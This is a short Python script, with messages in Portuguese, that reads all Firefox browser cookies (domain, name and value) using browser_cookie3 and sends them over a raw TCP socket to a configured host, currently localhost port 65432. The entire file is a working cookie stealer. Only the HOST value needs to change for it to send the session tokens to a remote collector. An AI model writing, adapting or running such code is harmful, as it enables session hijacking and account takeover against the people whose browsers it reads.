import socket
import browser_cookie3
import time

HOST = 'localhost'
PORT = 65432

def coletar_cookies():
    try:
        cj = browser_cookie3.firefox()  # Ou .chrome()
        cookies_str = ''
        for cookie in cj:
            cookies_str += f"{cookie.domain}\t{cookie.name}\t{cookie.value}\n"
        return cookies_str
    except Exception as e:
        print('Erro ao coletar cookies:', e)
        return ''

def enviar_cookies(dados):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(dados.encode('utf-8'))
            print('Cookies enviados com sucesso.')
    except Exception as e:
        print('Erro na conexão ou envio:', e)

if __name__ == '__main__':
    cookies = coletar_cookies()
    if cookies:
        enviar_cookies(cookies)
    else:
        print('Nenhum cookie para enviar.')
    print('Fim do programa. Fechando em 10 segundos...')
    time.sleep(10)
